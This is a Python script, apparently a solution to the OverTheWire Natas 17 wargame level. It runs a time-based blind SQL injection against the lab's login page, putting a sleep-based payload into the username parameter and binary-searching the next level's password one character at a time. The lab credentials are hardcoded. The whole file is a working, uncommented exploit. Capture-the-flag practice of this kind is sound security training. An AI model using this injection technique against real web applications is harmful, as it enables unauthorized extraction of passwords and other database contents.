import requests
from requests.auth import HTTPBasicAuth

def query(param):
    print("querying {}".format(param))
    url = "http://natas17.natas.labs.overthewire.org/index.php"
    auth = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
    params = {'username': param}

    res = requests.get(url, params=params, auth=auth)
    return res.elapsed.total_seconds() > 2

length = 32

import string
chars = list(sorted(string.printable[:62]))
print(chars)

cur = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
while len(cur) < length:
    lo = 0
    hi = len(chars)
    while (hi != lo+1):
        mid = (hi + lo) // 2

        test = cur + chars[mid]
        if query('" or 1 = (SELECT IF(password >= BINARY "{}", sleep(2), 1)) #'.format(test)):
            lo = mid
        else:
            hi = mid

    cur += chars[lo]
    print(cur)

